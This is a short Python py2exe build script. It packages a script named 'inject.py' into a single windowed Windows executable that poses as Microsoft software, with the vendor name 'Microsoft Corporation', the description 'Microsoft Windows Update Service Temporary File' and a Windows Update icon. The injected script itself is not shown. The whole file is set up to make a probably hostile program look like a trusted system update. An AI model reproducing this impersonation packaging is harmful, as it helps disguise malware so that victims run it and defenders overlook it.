from distutils.core import setup
import py2exe, os

options = dict(ascii=True, # Exclude encodings
                       # Exclude unwanted libraried to cut down filesize
                       excludes=['_ssl', 'pyreadline', 'difflib', 'doctest', 'locale',
                                 'optparse', 'pickle', 'calendar', 'pbd', 'unittest', 'inspect'],
                       # Exclude DLLs which cause conflicts and errors
                       dll_excludes=['msvcr71.dll', 'w9xpopen.exe',
                                     'API-MS-Win-Core-LocalRegistry-L1-1-0.dll',
                                     'API-MS-Win-Core-ProcessThreads-L1-1-0.dll',
                                     'API-MS-Win-Security-Base-L1-1-0.dll',
                                     'KERNELBASE.dll', 'POWRPROF.dll', 'mswsock.dll'],
                       bundle_files = 1,
                       optimize = 2                 
                       )

setup(name='Microsoft Corporation',
        version='1.0',
        description='Microsoft Windows Update Service Temporary File',
        author='Bill Rondell',
        options = dict(py2exe=options),
        windows = [{'script': "inject.py",
                    'icon_resources': [(1, "winupdate.ico")]
                   }],
        zipfile = None,
   )


print "Removing Trash"
os.system("rmdir /s /q build")
os.system("del /q *.pyc")
print "Build Complete"
